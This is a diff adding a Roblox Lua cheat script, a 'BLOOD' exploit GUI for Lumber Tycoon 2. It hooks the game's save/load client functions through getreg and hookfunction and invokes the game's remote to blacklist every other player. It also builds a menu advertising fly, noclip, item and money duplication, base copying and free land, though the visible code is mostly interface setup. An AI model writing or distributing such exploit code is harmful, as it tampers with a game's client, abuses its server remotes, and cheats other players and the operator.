@@ -1,0 +1,5180 @@
+for i,v in pairs(getreg()) do 
+   if typeof(v) == "function" and getfenv(v).script == game.Players.LocalPlayer.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript then 
+       hookfunction(v, function() end)
+   end
+end
+
+local Intro = Instance.new("ScreenGui")
+local IntroImage = Instance.new("ImageLabel")
+local _1 = Instance.new("TextLabel")
+local _2 = Instance.new("TextLabel")
+local _3 = Instance.new("TextLabel")
+local _4 = Instance.new("TextLabel")
+local _5 = Instance.new("TextLabel")
+local _6 = Instance.new("TextLabel")
+local _7 = Instance.new("TextLabel")
+
+-- Properties
+
+Intro.Name = "Intro"
+Intro.Parent = game.CoreGui
+
+IntroImage.Name = "IntroImage"
+IntroImage.Parent = Intro
+IntroImage.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+IntroImage.BackgroundTransparency = 1
+IntroImage.BorderColor3 = Color3.new(1, 1, 1)
+IntroImage.BorderSizePixel = 0
+IntroImage.Position = UDim2.new(0.400, 0, 0.200, 0)
+IntroImage.Size = UDim2.new(0, 356, 0, 347)
+IntroImage.Image = "rbxassetid://1130382821"
+
+_1.Name = "1"
+_1.Parent = IntroImage
+_1.BackgroundColor3 = Color3.fromRGB(249, 214, 46)
+_1.BackgroundTransparency = 1
+_1.BorderSizePixel = 0
+_1.Position = UDim2.new(0.109550565, 0, 0.423631132, 0)
+_1.Size = UDim2.new(0, 40, 0, 53)
+_1.Font = Enum.Font.ArialBold
+_1.FontSize = Enum.FontSize.Size14
+_1.Text = " "
+_1.TextColor3 = Color3.new(255, 0, 0)
+_1.TextScaled = true
+_1.TextSize = 14
+_1.TextWrapped = true
+
+_2.Name = "2"
+_2.Parent = IntroImage
+_2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+_2.BackgroundTransparency = 1
+_2.BorderSizePixel = 0
+_2.Position = UDim2.new(0.221910119, 0, 0.423631132, 0)
+_2.Size = UDim2.new(0, 40, 0, 53)
+_2.Font = Enum.Font.ArialBold
+_2.FontSize = Enum.FontSize.Size14
+_2.Text = "B"
+_2.TextColor3 = Color3.new(255, 0, 0)
+_2.TextScaled = true
+_2.TextSize = 14
+_2.TextWrapped = true
+
+_3.Name = "3"
+_3.Parent = IntroImage
+_3.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+_3.BackgroundTransparency = 1
+_3.BorderSizePixel = 0
+_3.Position = UDim2.new(0.334269673, 0, 0.423631132, 0)
+_3.Size = UDim2.new(0, 40, 0, 53)
+_3.Font = Enum.Font.ArialBold
+_3.FontSize = Enum.FontSize.Size14
+_3.Text = "L"
+_3.TextColor3 = Color3.new(255, 0, 0)
+_3.TextScaled = true
+_3.TextSize = 14
+_3.TextWrapped = true
+
+_4.Name = "4"
+_4.Parent = IntroImage
+_4.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+_4.BackgroundTransparency = 1
+_4.BorderSizePixel = 0
+_4.Position = UDim2.new(0.446629226, 0, 0.423631132, 0)
+_4.Size = UDim2.new(0, 40, 0, 53)
+_4.Font = Enum.Font.ArialBold
+_4.FontSize = Enum.FontSize.Size14
+_4.Text = "O"
+_4.TextColor3 = Color3.new(255, 0, 0)
+_4.TextScaled = true
+_4.TextSize = 14
+_4.TextWrapped = true
+
+_5.Name = "5"
+_5.Parent = IntroImage
+_5.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+_5.BackgroundTransparency = 1
+_5.BorderSizePixel = 0
+_5.Position = UDim2.new(0.55898881, 0, 0.423631132, 0)
+_5.Size = UDim2.new(0, 40, 0, 53)
+_5.Font = Enum.Font.ArialBold
+_5.FontSize = Enum.FontSize.Size14
+_5.Text = "O"
+_5.TextColor3 = Color3.new(255, 0, 0)
+_5.TextScaled = true
+_5.TextSize = 14
+_5.TextWrapped = true
+
+_6.Name = "6"
+_6.Parent = IntroImage
+_6.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+_6.BackgroundTransparency = 1
+_6.BorderSizePixel = 0
+_6.Position = UDim2.new(0.671348333, 0, 0.423631132, 0)
+_6.Size = UDim2.new(0, 40, 0, 53)
+_6.Font = Enum.Font.ArialBold
+_6.FontSize = Enum.FontSize.Size14
+_6.Text = "D"
+_6.TextColor3 = Color3.new(255, 0, 0)
+_6.TextScaled = true
+_6.TextSize = 14
+_6.TextWrapped = true
+
+_7.Name = "7"
+_7.Parent = IntroImage
+_7.BackgroundColor3 = Color3.new(1, 1, 1)
+_7.BackgroundTransparency = 1
+_7.BorderSizePixel = 0
+_7.Position = UDim2.new(0.775280893, 0, 0.423631132, 0)
+_7.Size = UDim2.new(0, 40, 0, 53)
+_7.Font = Enum.Font.ArialBold
+_7.FontSize = Enum.FontSize.Size14
+_7.Text = " "
+_7.TextColor3 = Color3.new(255, 0, 0)
+_7.TextScaled = true
+_7.TextSize = 14
+_7.TextWrapped = true
+
+
+
+_1.TextTransparency = 0.2
+wait()
+_2.TextTransparency = 0.2
+wait()
+_3.TextTransparency = 0.2
+wait()
+_4.TextTransparency = 0.2
+wait()
+_5.TextTransparency = 0.2
+wait()
+_6.TextTransparency = 0.2
+wait()
+_7.TextTransparency = 0.2
+wait()
+IntroImage.ImageTransparency = 0.2
+wait()
+_1.TextTransparency = 0.3
+wait()
+_2.TextTransparency = 0.3
+wait()
+_3.TextTransparency = 0.3
+wait()
+_4.TextTransparency = 0.3
+wait()
+_5.TextTransparency = 0.3
+wait()
+_6.TextTransparency = 0.3
+wait()
+_7.TextTransparency = 0.3
+wait()
+IntroImage.ImageTransparency = 0.3
+wait()
+_1.TextTransparency = 0.4
+wait()
+_2.TextTransparency = 0.4
+wait()
+_3.TextTransparency = 0.4
+wait()
+_4.TextTransparency = 0.4
+wait()
+_5.TextTransparency = 0.4
+wait()
+_6.TextTransparency = 0.4
+wait()
+_7.TextTransparency = 0.4
+wait()
+IntroImage.ImageTransparency = 0.4
+wait()
+_1.TextTransparency = 0.5
+wait()
+_2.TextTransparency = 0.5
+wait()
+_3.TextTransparency = 0.4
+wait()
+_4.TextTransparency = 0.5
+wait()
+_5.TextTransparency = 0.5
+wait()
+_6.TextTransparency = 0.5
+wait()
+_7.TextTransparency = 0.5
+wait()
+IntroImage.ImageTransparency = 0.5
+wait()
+_1.TextTransparency = 0.6
+wait()
+_2.TextTransparency = 0.6
+wait()
+_3.TextTransparency = 0.6
+wait()
+_4.TextTransparency = 0.6
+wait()
+_5.TextTransparency = 0.6
+wait()
+_6.TextTransparency = 0.6
+wait()
+_7.TextTransparency = 0.6
+wait()
+IntroImage.ImageTransparency = 0.6
+wait()
+_1.TextTransparency = 0.7
+wait()
+_2.TextTransparency = 0.7
+wait()
+_3.TextTransparency = 0.7
+wait()
+_4.TextTransparency = 0.7
+wait()
+_5.TextTransparency = 0.7
+wait()
+_6.TextTransparency = 0.7
+wait()
+_7.TextTransparency = 0.7
+wait()
+IntroImage.ImageTransparency = 0.7
+wait()
+_1.TextTransparency = 0.8
+wait()
+_2.TextTransparency = 0.8
+wait()
+_3.TextTransparency = 0.8
+wait()
+_4.TextTransparency = 0.8
+wait()
+_5.TextTransparency = 0.8
+wait()
+_6.TextTransparency = 0.8
+wait()
+_7.TextTransparency = 0.8
+wait()
+IntroImage.ImageTransparency = 0.8
+wait()
+_1.TextTransparency = 0.9
+wait()
+_2.TextTransparency = 0.9
+wait()
+_3.TextTransparency = 0.9
+wait()
+_4.TextTransparency = 0.9
+wait()
+_5.TextTransparency = 0.9
+wait()
+_6.TextTransparency = 0.9
+wait()
+_7.TextTransparency = 0.9
+wait()
+IntroImage.ImageTransparency = 0.9
+wait()
+_1.TextTransparency = 1
+wait()
+_2.TextTransparency = 1
+wait()
+_3.TextTransparency = 1
+wait()
+_4.TextTransparency = 1
+wait()
+_5.TextTransparency = 1
+wait()
+_6.TextTransparency = 1
+wait()
+_7.TextTransparency = 1
+wait()
+IntroImage.ImageTransparency = 0.9
+wait()
+_1.TextTransparency = 1.1
+wait()
+_2.TextTransparency = 1.1
+wait()
+_3.TextTransparency = 1.1
+wait()
+_4.TextTransparency = 1.1
+wait()
+_5.TextTransparency = 1.1
+wait()
+_6.TextTransparency = 1.1
+wait()
+_7.TextTransparency = 1.1
+wait()
+IntroImage.ImageTransparency = 5.1
+wait()
+Intro:Destroy()
+wait()
+
+local s = Instance.new("Sound")
+s.Name = "Sound"
+s.SoundId = "http://www.roblox.com/asset/?id=2528420941"
+s.Volume = 0
+s.Looped = false
+s.archivable = false
+s.Parent = game.Workspace
+--Join
+
+local k = Instance.new("Sound")
+k.Name = "Soundzz"
+k.SoundId = "http://www.roblox.com/asset/?id=305977837"
+k.Volume = 0
+k.Looped = false
+k.archivable = false
+k.Parent = game.Workspace
+--Left
+
+local q = Instance.new("Sound")
+q.Name = "Soundzzzz"
+q.SoundId = "http://www.roblox.com/asset/?id=249869145"
+q.Volume = 0
+q.Looped = false
+q.archivable = false
+q.Parent = game.Workspace
+--Systems Online
+
+local function SendNotification(title,text,duration,...)
+  game.StarterGui:SetCore("SendNotification", {
+    Title = title;
+    Text = text;
+    Icon = "";
+    Duration = duration;
+  })
+end
+
+  game.Players.ChildAdded:Connect(function(player)
+  if not pcall (function()
+  SendNotification("Player JOINED",""..player.Name.." has JOINED the game",5 )
+  s:Play()
+  end) then
+    print ("Error")
+  end
+  end)
+---------------------------------------------------------------------
+  -- Same extra's apply down here as well.
+
+  game.Players.ChildRemoved:Connect(function(player)
+  if not pcall (function()
+  SendNotification("Player LEFT",""..player.Name.." has LEFT the game",4.4 )
+  k:Play()
+  end) then
+    print ("Error")
+  end
+  end)
+  
+  SendNotification("Loaded","Join and leave detector is loaded",2)
+  q:Play()
+
+-- Variables --
+
+local Script = "BLOOD"
+local gFont = "SourceSans"
+local Visi = true
+
+-- Functions -- 
+
+function Log(text, r, g, b, font)
+    game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "{" .. tostring(Script) .. "} - " .. text;
+    Color = Color3.new(r, g, b);
+    Font = Enum.Font[font];
+    FontSize = Enum.FontSize.Size10;
+    })
+end
+
+---------------------------------------------------------------------
+
+-- Automatically Add players to Blacklist --
+
+Mouse = game.Players.LocalPlayer:GetMouse()
+
+
+Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
+
+Client = game.ReplicatedStorage.Interaction.ClientSetListPlayer
+players = game.Players
+for i, v in pairs(players:GetPlayers()) do
+	if v.Name ~= players.LocalPlayer.Name then
+		Client:InvokeServer(players.LocalPlayer.BlacklistFolder, v, true)
+	end
+end
+players.PlayerAdded:connect(function(plr)
+	Client:InvokeServer(players.LocalPlayer.BlacklistFolder, plr, true)
+end)
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+  Title = "BLOOD",
+  Text = "Loaded Successful."
+})
+
+local players = game:GetService('Players')
+if game.Players.LocalPlayer then 
+game.StarterGui:SetCore('SendNotification', {
+    Title = ' '.. players.LocalPlayer.Name..'!',
+    Text = 'Welcome to Bloods GUI!',
+    Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..players.LocalPlayer.Name..[[&RAND]] .. math.random(1,10000000),
+    Duration = 5,
+   })
+  end
+
+---------------------------------------------------------------------
+WCollide = "Nothing"
+afkactive = false
+CustomLocationSet = false
+
+BLOOD = Instance.new("ScreenGui")
+OpenFrame = Instance.new("Frame")
+Open = Instance.new("ImageButton")
+InfoText1 = Instance.new("TextLabel")
+MainFrame = Instance.new("Frame")
+ImageLabel = Instance.new("ImageLabel")
+CloseBLOOD = Instance.new("TextButton")
+Minimize = Instance.new("TextButton")
+MenuFrame = Instance.new("Frame")
+MenuFramea = Instance.new("Frame")
+AIntroImage = Instance.new("ImageLabel")
+AIntroImage1 = Instance.new("ImageLabel")
+AIntroImage2 = Instance.new("ImageLabel")
+AIntroImage3 = Instance.new("ImageLabel")
+BloodFrameInfo = Instance.new("TextLabel")
+Depart = Instance.new("TextLabel")
+ChangeItem = Instance.new("Frame")
+CurrentItem = Instance.new("ImageButton")
+Picker = Instance.new("ScrollingFrame")
+ctheme = Instance.new("TextButton")
+ctheme1 = Instance.new("TextButton")
+ctheme2 = Instance.new("TextButton")
+Player = Instance.new("ImageButton")
+PlayerFrame = Instance.new("Frame")
+PlayerTitle = Instance.new("TextLabel")
+Base1Title = Instance.new("TextLabel")
+WalkspeedLabel = Instance.new("TextButton")
+WalkSpeed = Instance.new("TextLabel")
+JumpText = Instance.new("TextBox")
+JumpPower = Instance.new("TextButton")
+FlyOn = Instance.new("TextButton")
+FlyOff = Instance.new("TextButton")
+Noclip = Instance.new("TextButton")
+ClickTP = Instance.new("TextButton")
+AntiAFK = Instance.new("TextButton")
+AntiAFKtime = Instance.new("TextLabel")
+ChatSpy = Instance.new("TextButton")
+Fog = Instance.new("TextButton")
+ReJoinServer = Instance.new("TextButton")
+Reset = Instance.new("TextButton")
+TeleportA = Instance.new("ImageButton")
+Waypoints = Instance.new("ScrollingFrame")
+WaypointsA = Instance.new("TextLabel")
+InfoText39 = Instance.new("ImageLabel")
+SpawnPoint = Instance.new("TextButton")
+InfoText40 = Instance.new("ImageLabel")
+PlotTp = Instance.new("TextButton")
+ShopsTitle = Instance.new("TextLabel")
+InfoText300 = Instance.new("ImageLabel")
+WoodRUs = Instance.new("TextButton")
+InfoText301 = Instance.new("ImageLabel")
+LandStore = Instance.new("TextButton")
+InfoText41 = Instance.new("ImageLabel")
+FancyFurnishings = Instance.new("TextButton")
+InfoText42 = Instance.new("ImageLabel")
+LinksLogic = Instance.new("TextButton")
+InfoText302 = Instance.new("ImageLabel")
+CarShop = Instance.new("TextButton")
+InfoText43 = Instance.new("ImageLabel")
+FineArtsShop = Instance.new("TextButton")
+InfoText44 = Instance.new("ImageLabel")
+BobsShack = Instance.new("TextButton")
+LandMarkTitle = Instance.new("TextLabel")
+InfoText45 = Instance.new("ImageLabel")
+TheDen = Instance.new("TextButton")
+InfoText46 = Instance.new("ImageLabel")
+ShrineOfSight = Instance.new("TextButton")
+InfoText47 = Instance.new("ImageLabel")
+SkiLodge = Instance.new("TextButton")
+InfoText48 = Instance.new("ImageLabel")
+Dock = Instance.new("TextButton")
+InfoText49 = Instance.new("ImageLabel")
+Bridge = Instance.new("TextButton")
+InfoText50 = Instance.new("ImageLabel")
+Stranger = Instance.new("TextButton")
+InfoText51 = Instance.new("ImageLabel")
+VolcanoWin = Instance.new("TextButton")
+InfoText303 = Instance.new("ImageLabel")
+LightHouse = Instance.new("TextButton")
+InfoText304 = Instance.new("ImageLabel")
+BirdAxeCave = Instance.new("TextButton")
+Player1 = Instance.new("TextButton")
+Player2 = Instance.new("TextButton")
+Player3 = Instance.new("TextButton")
+Player4 = Instance.new("TextButton")
+Player5 = Instance.new("TextButton")
+Player6 = Instance.new("TextButton")
+PlyrSel = Instance.new("TextLabel")
+Woodmenu = Instance.new("ImageButton")
+WoodFrame = Instance.new("Frame")
+InfoText21 = Instance.new("TextLabel")
+Hel = Instance.new("TextButton")
+WoodTitle = Instance.new("TextLabel")
+ToSawmillTitle = Instance.new("TextLabel")
+SawmillTitle = Instance.new("TextLabel")
+SawmillSetTitle = Instance.new("TextLabel")
+KeybindingsTitle = Instance.new("TextLabel")
+SetSawmillKey = Instance.new("TextButton")
+SetSawTPKey = Instance.new("TextButton")
+SetSellTPKey = Instance.new("TextButton")
+SetSawBox = Instance.new("TextBox")
+SawTPBox = Instance.new("TextBox")
+SellWoodBox = Instance.new("TextBox")
+InfoText25 = Instance.new("TextLabel")
+TreeHeader = Instance.new("TextLabel")
+QuantityTree = Instance.new("TextBox")
+BirchTree = Instance.new("ImageButton")
+BirchHeader = Instance.new("TextLabel")
+CavecrawlerTree = Instance.new("ImageButton")
+CavecrawlerHeader = Instance.new("TextLabel")
+CherryTree = Instance.new("ImageButton")
+CherryHeader = Instance.new("TextLabel")
+ElmTree = Instance.new("ImageButton")
+ElmHeader = Instance.new("TextLabel")
+Frosttree = Instance.new("ImageButton")
+FrostHeader = Instance.new("TextLabel")
+GenericTree = Instance.new("ImageButton")
+GenericHeader = Instance.new("TextLabel")
+ZombieTree = Instance.new("ImageButton")
+ZombieHeader = Instance.new("TextLabel")
+GoldTree = Instance.new("ImageButton")
+GoldHeader = Instance.new("TextLabel")
+LavaTree = Instance.new("ImageButton")
+LavaHeader = Instance.new("TextLabel")
+PalmTree = Instance.new("ImageButton")
+PalmHeader = Instance.new("TextLabel")
+PhantomTree = Instance.new("ImageButton")
+PhantomHeader = Instance.new("TextLabel")
+PineTree = Instance.new("ImageButton")
+PineHeader = Instance.new("TextLabel")
+FirTree = Instance.new("ImageButton")
+FirHeader = Instance.new("TextLabel")
+Snowglowtree = Instance.new("ImageButton")
+SnowglowHeader = Instance.new("TextLabel")
+WalnutTree = Instance.new("ImageButton")
+WalnutHeader = Instance.new("TextLabel")
+KoaTree = Instance.new("ImageButton")
+KoaHeader = Instance.new("TextLabel")
+SinisterTree = Instance.new("ImageButton")
+SinisterGlowHeader = Instance.new("TextLabel")
+SpookTree = Instance.new("ImageButton")
+SpookHeader = Instance.new("TextLabel")
+INFOHeader = Instance.new("TextLabel")
+INFOHeader2 = Instance.new("TextLabel")
+WoodTools = Instance.new("TextLabel")
+InfoText22 = Instance.new("TextLabel")
+Goldaxe = Instance.new("TextButton")
+InfoText24 = Instance.new("TextLabel")
+Treeaura = Instance.new("TextButton")
+InfoText23 = Instance.new("TextLabel")
+Harddrag = Instance.new("TextButton")
+RemoveT = Instance.new("TextButton")
+Bringtreehelp = Instance.new("TextLabel")
+Waypointsb = Instance.new("Frame")
+Copymenu = Instance.new("ImageButton")
+CopyFrame = Instance.new("Frame")
+MakeBase = Instance.new("ScrollingFrame")
+BaseTitle = Instance.new("TextLabel")
+InfoText305 = Instance.new("ImageLabel")
+Base = Instance.new("TextButton")
+InfoText306 = Instance.new("ImageLabel")
+Base1 = Instance.new("TextButton")
+InfoText307 = Instance.new("ImageLabel")
+Base2 = Instance.new("TextButton")
+InfoText308 = Instance.new("ImageLabel")
+Base3 = Instance.new("TextButton")
+InfoText309 = Instance.new("ImageLabel")
+Base4 = Instance.new("TextButton")
+InfoText310 = Instance.new("ImageLabel")
+Base5 = Instance.new("TextButton")
+InfoText311 = Instance.new("ImageLabel")
+Base6 = Instance.new("TextButton")
+InfoText312 = Instance.new("ImageLabel")
+Base7 = Instance.new("TextButton")
+InfoText313 = Instance.new("ImageLabel")
+Base8 = Instance.new("TextButton")
+InfoText314 = Instance.new("ImageLabel")
+Base9 = Instance.new("TextButton")
+InfoText315 = Instance.new("ImageLabel")
+Base10 = Instance.new("TextButton")
+InfoText316 = Instance.new("ImageLabel")
+Base11 = Instance.new("TextButton")
+InfoText317 = Instance.new("ImageLabel")
+Base12 = Instance.new("TextButton")
+InfoText318 = Instance.new("ImageLabel")
+Base13 = Instance.new("TextButton")
+InfoText319 = Instance.new("ImageLabel")
+Base14 = Instance.new("TextButton")
+InfoText320 = Instance.new("ImageLabel")
+Base15 = Instance.new("TextButton")
+InfoText321 = Instance.new("ImageLabel")
+Base16 = Instance.new("TextButton")
+InfoText322 = Instance.new("ImageLabel")
+Base17 = Instance.new("TextButton")
+InfoText323 = Instance.new("ImageLabel")
+Base18 = Instance.new("TextButton")
+InfoText324 = Instance.new("ImageLabel")
+Base19 = Instance.new("TextButton")
+InfoText325 = Instance.new("ImageLabel")
+Base20 = Instance.new("TextButton")
+InfoText326 = Instance.new("ImageLabel")
+Base21 = Instance.new("TextButton")
+PlayerCopy = Instance.new("TextLabel")
+PlayerNameBox = Instance.new("TextBox")
+Player1a = Instance.new("TextButton")
+Player2a = Instance.new("TextButton")
+Player3a = Instance.new("TextButton")
+Player4a = Instance.new("TextButton")
+Player5a = Instance.new("TextButton")
+Player6a = Instance.new("TextButton")
+InfoText4 = Instance.new("TextLabel")
+CopyBase = Instance.new("TextButton")
+DupeTitle = Instance.new("TextLabel")
+InfoText5 = Instance.new("TextLabel")
+ItemDupe = Instance.new("TextButton")
+Slot = Instance.new("TextBox")
+DMoney = Instance.new("TextButton")
+InfoText3 = Instance.new("TextLabel")
+Load = Instance.new("TextButton")
+InfoText2 = Instance.new("TextLabel")
+PlayerNameb = Instance.new("TextBox")
+Player1b = Instance.new("TextButton")
+Player2b = Instance.new("TextButton")
+Player3b = Instance.new("TextButton")
+Player4b = Instance.new("TextButton")
+Player5b = Instance.new("TextButton")
+Player6b = Instance.new("TextButton")
+WipeBase = Instance.new("TextButton")
+CBlueprint = Instance.new("TextButton")
+CStructure = Instance.new("TextButton")
+FreeLand = Instance.new("TextButton")
+MaxLand = Instance.new("TextButton")
+BluePrints = Instance.new("TextButton")
+Landart = Instance.new("TextButton")
+Hoofer = Instance.new("TextButton")
+PaintFill = Instance.new("TextButton")
+ArtFrame = Instance.new("Frame")
+Artmenu = Instance.new("ImageButton")
+Paint = Instance.new("TextButton")
+CarToolsa = Instance.new('TextLabel')
+CARA = Instance.new("TextButton")
+CARAs = Instance.new("TextBox")
+Carfly = Instance.new("TextButton")
+CarflyA = Instance.new("TextBox")
+Brid = Instance.new("TextLabel")
+BridDown = Instance.new("TextButton")
+Bridup = Instance.new("TextButton")
+ModToolsa = Instance.new('TextLabel')
+VBlood = Instance.new('ScreenGui')
+TitleVersion = Instance.new('Frame')
+Title = Instance.new('TextLabel')
+Version = Instance.new('TextLabel')
+AIntroImage = Instance.new("ImageButton")
+LT2GUI2Frame = Instance.new("Frame")
+Btoolamenu = Instance.new("ImageButton")
+FunStuffHOVER = Instance.new("TextButton")
+FunStuffTHOMAS = Instance.new("TextButton")
+FunStuffPOLICE = Instance.new("TextButton")
+FunStuffSPRAY = Instance.new("TextButton")
+FunStuffCOCA = Instance.new("TextButton")
+FunStuffLEAKED = Instance.new("TextButton")
+FunStuffFLASH = Instance.new("TextButton")
+BToolALL = Instance.new("TextButton")
+BuyFrame = Instance.new("Frame")
+Buymenu = Instance.new("ImageButton")
+bcps = Instance.new("TextButton")
+wrus = Instance.new("TextButton")
+fshop = Instance.new("TextButton")
+bp = Instance.new("TextButton")
+ls = Instance.new("TextButton")
+toolaFrame = Instance.new("Frame")
+toolamenu = Instance.new("ImageButton")
+InfoText14 = Instance.new("TextLabel")
+InfoText15 = Instance.new("TextLabel")
+InfoText16 = Instance.new("TextLabel")
+InfoText17 = Instance.new("TextLabel")
+InfoText18 = Instance.new("TextLabel")
+InfoText19 = Instance.new("TextLabel")
+InfoText20 = Instance.new("TextLabel")
+InfoText30 = Instance.new("TextLabel")
+InfoText32 = Instance.new("TextLabel")
+InfoText33 = Instance.new("TextLabel")
+InfoText34 = Instance.new("TextLabel")
+InfoText35 = Instance.new("TextLabel")
+InfoText36 = Instance.new("TextLabel")
+InfoText37 = Instance.new("TextLabel")
+InfoText38 = Instance.new("TextLabel")
+InfoText302 = Instance.new("ImageLabel")
+TimesFrame = Instance.new("Frame")
+TimesTitle = Instance.new("TextLabel")
+TimeNowTitle = Instance.new("TextLabel")
+CarsTitle = Instance.new("TextLabel")
+FurnishTitle = Instance.new("TextLabel")
+LinkTitle = Instance.new("TextLabel")
+OtherShopsNote = Instance.new("TextLabel")
+FOpenTitle = Instance.new("TextLabel")
+COpenTitle = Instance.new("TextLabel")
+LOpenTitle = Instance.new("TextLabel")
+DropAxes = Instance.new("TextButton")
+AXETRUCK = Instance.new("TextButton")
+WireObjects = Instance.new("TextButton")
+giftsport = Instance.new("TextButton")
+HardStructures = Instance.new("TextButton")
+other = Instance.new("TextButton")
+other1 = Instance.new("TextButton")
+TPtreesPlanks = Instance.new("TextButton")
+Paintingf = Instance.new("TextButton")
+MapModify = Instance.new("TextButton")
+LavaBoulders = Instance.new("TextButton")
+IceBoulders = Instance.new("TextButton")
+ShrineDoors = Instance.new("TextButton")
+MazeWalls = Instance.new("TextButton")
+PalmBridge = Instance.new("TextButton")
+SafariBridge = Instance.new("TextButton")
+RemoveTitle = Instance.new("TextLabel")
+BridgesTitle = Instance.new("TextLabel")
+GoldBridge = Instance.new("TextButton")
+YellowBridge = Instance.new("TextButton")
+Platform = Instance.new("TextButton")
+Drivable = Instance.new("TextButton")
+CarRotate = Instance.new("TextButton")
+CarRotates = Instance.new("TextButton")
+RadioLabel = Instance.new("ImageLabel")
+Stop = Instance.new("TextButton")
+Vol = Instance.new("TextButton")
+Radio = Instance.new("ImageButton")
+RadioFrame = Instance.new("Frame")
+PinkCar = Instance.new("TextButton")
+MapModify = Instance.new("TextButton")
+PinkCars = Instance.new("TextButton")
+
+OPFinality1 = Instance.new("TextButton")
+--Properties:
+BLOOD.Name = "BLOOD"
+BLOOD.Parent = game.CoreGui
+
+OpenFrame.Name = "OpenFrame"
+OpenFrame.Parent = BLOOD
+OpenFrame.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+OpenFrame.BorderColor3 = Color3.fromRGB(196, 40, 28)
+OpenFrame.Position = UDim2.new(0, -621, 0, 611)
+OpenFrame.Size = UDim2.new(0, 80, 0, 40)
+OpenFrame:TweenPosition(UDim2.new(0, 18, 0, 685), "In", "Back",2.5)
+
+Open.Name = "Open"
+Open.Parent = OpenFrame
+Open.BackgroundColor3 = Color3.new(0, 0, 0)
+Open.BorderColor3 = Color3.new(0, 0, 0)
+Open.Size = UDim2.new(0, 80, 0, 40)
+Open.Image = "rbxassetid://4889132908"
+Open.Selectable = true
+
+
+
+Open.MouseEnter:connect(function()
+InfoText1.Visible = true
+end)
+
+Open.MouseLeave:connect(function()
+InfoText1.Visible = false
+end)
+
+InfoText1.Name = "InfoText1"
+InfoText1.Parent = OpenFrame
+InfoText1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText1.BorderColor3 = Color3.new(0, 0, 0)
+InfoText1.BackgroundTransparency = 0.5
+InfoText1.Position = UDim2.new(0, 5, 0, 50)
+InfoText1.Size = UDim2.new(0, 190, 0, 100)
+InfoText1.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText1.Font = Enum.Font.Fantasy
+InfoText1.Text = "This Gui was created by Oddy\nCredits:\nKingadasouth and Johiro for the original scripts and fixing some broken ones."
+InfoText1.TextSize = 15
+InfoText1.TextWrapped = true
+InfoText1.Visible = false
+InfoText1.ZIndex = 7
+InfoText1.TextYAlignment = Enum.TextYAlignment.Top
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = BLOOD
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+MainFrame.Position = UDim2.new(0.0111675123, 0, 0.436827958, 0)
+MainFrame.Selectable = true
+MainFrame.Size = UDim2.new(0, 500, 0, 500)
+MainFrame.Visible = false
+
+
+ImageLabel.Name = "ImageLabel"
+ImageLabel.Parent = MainFrame
+ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+ImageLabel.Position = UDim2.new(-0.000475523295, 0, -0.00117481197, 0)
+ImageLabel.Size = UDim2.new(0, 500, 0, 500)
+ImageLabel.Image = "rbxassetid://3883502641"
+
+CloseBLOOD.Name = "CloseBLOOD"
+CloseBLOOD.Parent = MainFrame
+CloseBLOOD.BackgroundColor3 = Color3.new(0, 0, 0)
+CloseBLOOD.BorderColor3 = Color3.fromRGB(196, 40, 28)
+CloseBLOOD.Position = UDim2.new(0, 5, 0, 5)
+CloseBLOOD.Size = UDim2.new(0, 20, 0, 20)
+CloseBLOOD.Font = Enum.Font.Fantasy
+CloseBLOOD.FontSize = Enum.FontSize.Size18
+CloseBLOOD.Text = "X"
+CloseBLOOD.TextColor3 = Color3.new(1, 1, 1)
+CloseBLOOD.TextScaled = true
+CloseBLOOD.TextWrapped = true
+CloseBLOOD.TextSize = 17
+
+Minimize.Name = "Minimize"
+Minimize.Parent = MainFrame
+Minimize.BackgroundColor3 = Color3.new(0, 0, 0)
+Minimize.BorderColor3 = Color3.fromRGB(196, 40, 28)
+Minimize.Position = UDim2.new(0, 26, 0, 5)
+Minimize.Size = UDim2.new(0, 20, 0, 20)
+Minimize.Font = Enum.Font.Fantasy
+Minimize.FontSize = Enum.FontSize.Size18
+Minimize.Text = "-"
+Minimize.TextColor3 = Color3.new(1, 1, 1)
+Minimize.TextScaled = true
+Minimize.TextWrapped = true
+Minimize.TextSize = 17
+
+MenuFrame.Name = "MenuFrame"
+MenuFrame.Parent = MainFrame
+MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MenuFrame.BackgroundTransparency = 1
+MenuFrame.BorderColor3 = Color3.new(0, 1, 0)
+MenuFrame.Position = UDim2.new(0, 5, 0, 30)
+MenuFrame.Size = UDim2.new(0, 170, 0,400)
+
+MenuFramea.Name = "MenuFrame"
+MenuFramea.Parent = MainFrame
+MenuFramea.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
+MenuFramea.BackgroundTransparency = 1
+MenuFramea.BorderColor3 = Color3.new(0, 1, 0)
+MenuFramea.Position = UDim2.new(0, 270, 0, 140)
+MenuFramea.Size = UDim2.new(0, 120, 0,350)
+
+AIntroImage.Name = "IntroImage"
+AIntroImage.Parent = MainFrame
+AIntroImage.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+AIntroImage.BackgroundTransparency = 1
+AIntroImage.BorderColor3 = Color3.new(1, 1, 1)
+AIntroImage.BorderSizePixel = 0
+AIntroImage.Position = UDim2.new(0, 50, 0, 325)
+AIntroImage.Size = UDim2.new(0, 80, 0, 40)
+AIntroImage.Image = "rbxassetid://4889132908"
+AIntroImage.Visible = true
+
+AIntroImage1.Name = "IntroImage"
+AIntroImage1.Parent = MainFrame
+AIntroImage1.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+AIntroImage1.BackgroundTransparency = 1
+AIntroImage1.BorderColor3 = Color3.new(1, 1, 1)
